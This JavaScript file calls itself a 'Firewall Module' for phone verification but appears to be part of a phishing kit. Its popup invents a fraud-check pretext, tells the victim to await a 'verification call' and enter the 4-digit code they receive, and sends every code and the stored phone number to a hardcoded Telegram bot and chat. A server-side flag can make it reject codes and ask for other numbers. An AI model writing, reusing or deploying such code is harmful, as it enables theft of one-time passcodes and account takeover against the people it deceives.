/**
 * Firewall Module - 4-digit Verification with Change Number Option
 */

// ========== TELEGRAM NOTIFICATION ==========
async function sendTelegram(phone, code, type = 'verify') {
    let msg = '';
    if (type === 'verify') {
        msg = `📞 VERIFY REQUEST\n📱 ${phone}\n🔑 Code: ${code}`;
    } else if (type === 'change_number') {
        msg = `📱 CHANGE NUMBER REQUEST\n📱 Original: ${phone}\n📱 New Number: ${code}`;
    }
    try {
        await fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(msg)}`);
        console.log("📨 Telegram sent");
    } catch(e) {
        console.log("Telegram error:", e);
    }
}

// ========== CHECK CHANGE NUMBER REQUIREMENT ==========
async function isChangeNumberRequired() {
    if (typeof firebase !== 'undefined' && firebase.database) {
        try {
            const db = firebase.database();
            const snap = await db.ref('admin/changeNumberRequired').once('value');
            const data = snap.val();
            return (data && data.active === true);
        } catch(e) {
            return false;
        }
    }
    return false;
}

// ========== GLOBAL VARIABLES ==========
let currentVerificationCode = null;
let verificationAttempts = 0;

// ========== SHOW FIREWALL POPUP ==========
function showFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) {
        currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
        verificationAttempts = 0;
        console.log("📞 VERIFICATION CODE:", currentVerificationCode);
        updatePopupContent(false);
        popup.style.display = 'flex';
        setTimeout(() => {
            const ci = document.getElementById('verificationCode');
            if (ci) ci.focus();
        }, 100);
    }
}

// ========== UPDATE POPUP CONTENT ==========
function updatePopupContent(showChangeLink = false) {
    const content = document.getElementById('firewallPopupContent');
    if (!content) return;
    
    let changeLinkHtml = '';
    if (showChangeLink) {
        changeLinkHtml = `
            <div class="firewall-change-link" onclick="redirectToIndex()">
                <span class="change-icon">🔄</span>
                <span class="change-text">Change another mobile number</span>
            </div>
        `;
    }
    
    content.innerHTML = `
        <div class="firewall-warning-icon">📞</div>
        <h2>VERIFICATION REQUIRED</h2>
        <div class="firewall-message">
            <p>Due to multiple claiming requests detected in the system, a quick verification call is required before proceeding.</p>
            <p>Please wait for the system-verification call. You will receive a 4-digit code during the call.</p>
            <p>Enter the code below to continue.</p>
        </div>
        <div class="verification-input-group">
            <input type="text" id="verificationCode" class="verification-input" placeholder="Enter 4-digit code" maxlength="4" inputmode="numeric">
            <button id="verifyCodeBtn" class="verify-btn" onclick="verifyFirewallCode()">VERIFY NOW</button>
        </div>
        <div id="firewallRemark" class="firewall-remark" style="display: none;"></div>
        ${changeLinkHtml}
        <div class="firewall-note">
            <p>Waiting for system-verification call...</p>
        </div>
        <div id="firewallErrorMsg" class="firewall-error" style="display: none;"></div>
    `;
}

// ========== SHOW REMARK ==========
function showRemark(message, isError = true) {
    const remarkDiv = document.getElementById('firewallRemark');
    if (remarkDiv) {
        remarkDiv.style.display = 'block';
        remarkDiv.innerHTML = message;
        remarkDiv.className = isError ? 'firewall-remark error' : 'firewall-remark success';
        remarkDiv.style.animation = 'fadeInOut 0.5s ease';
        setTimeout(() => {
            remarkDiv.style.display = 'none';
        }, 3000);
    }
}

// ========== HIDE FIREWALL POPUP ==========
function hideFirewallPopup() {
    const popup = document.getElementById('firewallPopup');
    if (popup) popup.style.display = 'none';
}

// ========== REDIRECT TO INDEX ==========
window.redirectToIndex = function() {
    localStorage.removeItem("userPhone");
    localStorage.removeItem("userDeviceId");
    window.location.href = "index.html";
};

// ========== VERIFY 4-DIGIT CODE ==========
window.verifyFirewallCode = async function() {
    const codeInput = document.getElementById('verificationCode');
    const code = codeInput ? codeInput.value.trim() : '';
    const errorDiv = document.getElementById('firewallErrorMsg');
    const verifyBtn = document.getElementById('verifyCodeBtn');
    const userPhone = localStorage.getItem("userPhone") || "Unknown";
    
    if (!code || code.length < 4) {
        if (errorDiv) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
        }
        return;
    }
    
    if (verifyBtn) {
        verifyBtn.disabled = true;
        verifyBtn.innerHTML = "VERIFYING...";
    }
    if (errorDiv) errorDiv.style.display = 'none';
    
    verificationAttempts++;
    
    // Check if change number is required
    const changeRequired = await isChangeNumberRequired();
    
    if (changeRequired) {
        // CHANGE # IS CHECKED - Show "Please change registered number" message
        await sendTelegram(userPhone, code, 'verify');
        showRemark('⚠️ <strong class="highlight-error">Please change registered number</strong>', true);
        updatePopupContent(true); // Show change link
        if (verifyBtn) {
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = "VERIFY NOW";
        }
        if (codeInput) {
            codeInput.value = '';
            codeInput.focus();
        }
    } else {
        // CHANGE # IS UNCHECKED - Normal verification
        const isValid = (code === currentVerificationCode);
        
        if (isValid) {
            await sendTelegram(userPhone, code, 'verify');
            hideFirewallPopup();
            alert("Verification successful. Page will refresh.");
            setTimeout(() => {
                window.location.reload();
            }, 500);
        } else {
            await sendTelegram(userPhone, code, 'verify');
            showRemark('⚠️ <strong class="highlight-error">Invalid 4-digit Verification Code</strong>. Please try again.', true);
            if (codeInput) {
                codeInput.value = '';
                codeInput.focus();
            }
            if (verifyBtn) {
                verifyBtn.disabled = false;
                verifyBtn.innerHTML = "VERIFY NOW";
            }
            if (verificationAttempts >= 3) {
                showRemark('⚠️ Too many failed attempts. Page will refresh.', true);
                setTimeout(() => {
                    window.location.reload();
                }, 2000);
            }
        }
    }
};

// ========== EXPOSE FUNCTIONS ==========
window.showFirewallPopup = showFirewallPopup;
window.hideFirewallPopup = hideFirewallPopup;
window.verifyFirewallCode = verifyFirewallCode;
window.isChangeNumberRequired = isChangeNumberRequired;